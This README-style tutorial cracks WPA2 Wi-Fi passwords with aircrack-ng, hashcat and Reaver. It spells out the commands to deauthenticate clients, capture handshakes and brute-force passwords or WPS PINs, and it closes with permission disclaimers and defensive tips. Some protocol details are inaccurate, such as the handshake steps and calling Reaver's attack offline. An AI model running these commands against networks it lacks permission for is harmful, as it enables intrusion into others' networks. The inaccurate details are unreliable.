# WPA2 Cracking

This repository contains a detailed guide to cracking WPA2 Wi-Fi networks for educational and ethical hacking purposes only. Always ensure you have permission to test any network you attempt to crack.

## Table of Contents

1. [Introduction](#introduction)
2. [Understanding WPA2 Encryption](#understanding-wpa2-encryption)
3. [Tools Required for WPA2 Cracking](#tools-required-for-wpa2-cracking)
4. [Setting Up a Test Environment](#setting-up-a-test-environment)
5. [Cracking WPA2 Using Aircrack-ng](#cracking-wpa2-using-aircrack-ng)
6. [Cracking WPA2 Using Hashcat](#cracking-wpa2-using-hashcat)
7. [Using Reaver for WPA2 PIN Attacks](#using-reaver-for-wpa2-pin-attacks)
8. [Best Practices & Security Measures](#best-practices--security-measures)
9. [Ethical Considerations](#ethical-considerations)
10. [Conclusion](#conclusion)

---

## Introduction

Wi-Fi Protected Access 2 (WPA2) is a security protocol used to protect Wi-Fi networks. It is commonly used in home and business networks. WPA2 uses Advanced Encryption Standard (AES) for encryption, making it more secure than its predecessor, WPA. However, WPA2 is not immune to attacks, and security researchers have identified ways to crack WPA2 passwords through techniques such as dictionary attacks, brute force, and more.


## Understanding WPA2 Encryption

WPA2 operates on a 4-way handshake that occurs when a client connects to a WPA2-secured network. This handshake is used to establish an encryption key (pairwise transient key, PTK) between the client and the access point. Cracking WPA2 essentially means capturing this handshake and trying to deduce the password from it.

### The WPA2 4-Way Handshake
- **Step 1:** The client sends a request to connect to the access point (AP).
- **Step 2:** The AP responds with a nonce (a random value).
- **Step 3:** The client generates a nonce, encrypts it with a key derived from the password, and sends it back to the AP.
- **Step 4:** The AP and client complete the handshake by verifying the generated keys.

The goal of cracking WPA2 is to capture this 4-way handshake and use a brute-force attack to guess the password by matching the captured handshake against a dictionary or through a custom attack.

---

## Tools Required for WPA2 Cracking

The following tools are commonly used for WPA2 cracking:

### 1. **Aircrack-ng**
   - A suite of tools for auditing wireless networks. It includes tools to capture handshakes, inject packets, and crack passwords using dictionary or brute-force attacks.

   - **Installation:**
     ```bash
     sudo apt update
     sudo apt install aircrack-ng
     ```

### 2. **Hashcat**
   - A powerful password-cracking tool that can be used to crack WPA2 handshakes. It uses both CPU and GPU to accelerate cracking.

   - **Installation:**
     ```bash
     sudo apt update
     sudo apt install hashcat
     ```

### 3. **Reaver**
   - A tool specifically designed for offline brute-force attacks on the WPS (Wi-Fi Protected Setup) PIN of a router, which can often be used to retrieve WPA2 passwords.

   - **Installation:**
     ```bash
     sudo apt update
     sudo apt install reaver
     ```

---

## Setting Up a Test Environment

To practice WPA2 cracking, it’s important to set up a controlled environment:

1. **Wireless Network**: You should either own a router or have permission to test an existing one.
2. **Wireless Adapter**: Ensure that your Wi-Fi adapter supports monitor mode and packet injection (e.g., Alfa AWUS036H).
3. **Kali Linux**: Kali Linux is a penetration testing distribution that comes pre-loaded with the necessary tools.

---

## Cracking WPA2 Using Aircrack-ng

### Step 1: Monitor Mode
First, put your Wi-Fi adapter into monitor mode. This allows it to listen to network traffic.

```bash
sudo airmon-ng start wlan0
```
### Step 2: Capture the 4-Way Handshake
Use airodump-ng to capture the handshake. Start monitoring the desired channel.
```bash
sudo airodump-ng wlan0mon
```
Once you identify the target network, note the channel (e.g., 6) and the BSSID (MAC address) of the AP.
```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```
Wait for a client to connect or deauthenticate a client to force a handshake:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```
Once the handshake is captured, you will see a .cap file.
### Step 3: Crack the Password
Finally, use aircrack-ng to crack the WPA2 password using a dictionary file:
```bash
aircrack-ng capture.cap -w /path/to/wordlist.txt
```
### Step 4: Success or Failure
If the correct password is found in the wordlist, the crack will succeed.
## Cracking WPA2 Using Hashcat
### Step 1: Prepare the Handshake
Use aircrack-ng to convert the .cap file into a format that Hashcat can use.

```bash
aircrack-ng capture.cap -J handshake
```
This will create a handshake.hccapx file.

### Step 2: Start Hashcat
Now, use Hashcat to crack the password using your wordlist.

```bash
hashcat -m 2500 handshake.hccapx /path/to/wordlist.txt
```
You can adjust settings based on your system’s hardware for optimized performance. You can also use combined graphics cards to make the cracking process faster using GPUs. 

## Using Reaver for WPA2 PIN Attacks
Reaver can be used to attack routers that have WPS enabled. The WPS PIN is a 8-digit number that is vulnerable to brute-force attacks.

```bash
sudo reaver -i wlan0mon -b <BSSID> -vv
```
Reaver will attempt to guess the PIN and retrieve the WPA2 password.

**Warning**: WPS attacks may take a long time (hours or days) and may also damage the router’s security (e.g., locking out further attempts).
## Best Practices & Security Measures
Use Strong Passwords:
Ensure you use long, random passwords that are difficult to guess.
Disable WPS: 
If not needed, disable Wi-Fi Protected Setup (WPS) as it is vulnerable to brute-force attacks.
Enable WPA3:
WPA3 is the latest Wi-Fi security protocol and offers better protection than WPA2.
Monitor Your Network:
Regularly check for unauthorized devices on your network.
Use VPNs: 
A Virtual Private Network (VPN) can add an extra layer of security to your online activity.
## Ethical Considerations
WPA2 cracking is a serious matter, and performing attacks on networks without permission is illegal. Always ensure you have explicit permission before attempting to crack or test the security of any Wi-Fi network.

Here are some guidelines to follow:

**Permission**: 

Obtain written permission to test the network.   

**Ethical Hacking**:

If you're conducting penetration testing, ensure it is part of a legitimate security assessment.   

**Confidentiality**: 

Respect the privacy of others and avoid causing harm to networks.
## Conclusion
Cracking WPA2 can be a rewarding challenge for ethical hackers, but it should only be done in a responsible and legal manner. By understanding the tools and techniques involved, you can better secure your own networks and contribute to improving overall network security.

